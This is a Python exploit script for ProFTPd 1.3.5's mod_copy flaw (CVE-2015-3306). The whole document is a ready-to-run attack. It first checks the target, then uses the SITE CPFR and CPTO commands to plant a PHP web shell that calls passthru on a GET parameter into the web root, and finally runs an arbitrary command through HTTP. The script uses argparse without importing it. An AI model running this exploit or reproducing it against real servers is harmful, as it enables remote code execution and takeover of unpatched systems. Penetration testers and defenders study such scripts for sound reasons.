# Exploit Title: ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution
# Date: 18/04/2024
# Exploit Author: JHacKL
# Version: 1.3.5
# Tested on: Ubuntu 16.04.6 LTS
# CVE : CVE-2015-3306

#!/usr/bin/python3

import socket
import random
import string
import requests

class ProFTPDExploit:
    def __init__(self, rhost, rport_ftp, target_uri, tmppath, sitepath):
        self.rhost = rhost
        self.rport_ftp = rport_ftp
        self.target_uri = target_uri
        self.tmppath = tmppath
        self.sitepath = sitepath

    def check(self):
        try:
            sock = socket.create_connection((self.rhost, self.rport_ftp), timeout=10)
            sock.recv(4096)
            sock.send(b'SITE CPFR /etc/passwd\r\n')
            res = sock.recv(4096)
            sock.close()
            if b'350' in res:
                return True
            else:
                return False
        except Exception as e:
            print(f"Error checking vulnerability: {e}")
            return False

    def exploit(self, payload_cmd):
        try:
            payload = '_Exec_'
            payload_name = 'Attack.php'
            
            sock = socket.create_connection((self.rhost, self.rport_ftp), timeout=10)
            sock.recv(4096)
            sock.send(b'SITE CPFR /proc/self/cmdline\r\n')
            sock.recv(4096)
            sock.send(f'SITE CPTO {self.tmppath}/.<?php passthru($_GET[\'{payload}\']);?>\r\n'.encode())
            sock.recv(4096)
            sock.send(f'SITE CPFR {self.tmppath}/.<?php passthru($_GET[\'{payload}\']);?>\r\n'.encode())
            sock.recv(4096)
            sock.send(f'SITE CPTO {self.sitepath}/{payload_name}\r\n'.encode())
            sock.recv(4096)
            sock.close()
            
            print(f"Executing PHP payload {self.target_uri}/{payload_name}")
            response = requests.get(f"http://{self.rhost}{self.target_uri}/{payload_name}", params={payload: f"{payload_cmd}"})
            if response.status_code == 200:
                print("Payload executed successfully.")
            else:
                print("Failed to execute payload.")
        except Exception as e:
            print(f"Error exploiting vulnerability: {e}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='ProFTPD Exploit')
    parser.add_argument('--rhost', required=True, help='Remote host IP address')
    parser.add_argument('--rport_ftp', type=int, required=True, help='Remote FTP port')
    parser.add_argument('--target_uri', required=True, help='Target URI')
    parser.add_argument('--tmppath', required=True, help='Temporary path')
    parser.add_argument('--sitepath', required=True, help='Site path')
    parser.add_argument('--payload', required=True, help='Payload')
    args = parser.parse_args()

    exploit = ProFTPDExploit(
        rhost=args.rhost,
        rport_ftp=args.rport_ftp,
        target_uri=args.target_uri,
        tmppath=args.tmppath,
        sitepath=args.sitepath
    )

    if exploit.check():
        print("Target is vulnerable.")
        exploit.exploit(args.payload)
    else:
        print("Target is not vulnerable.")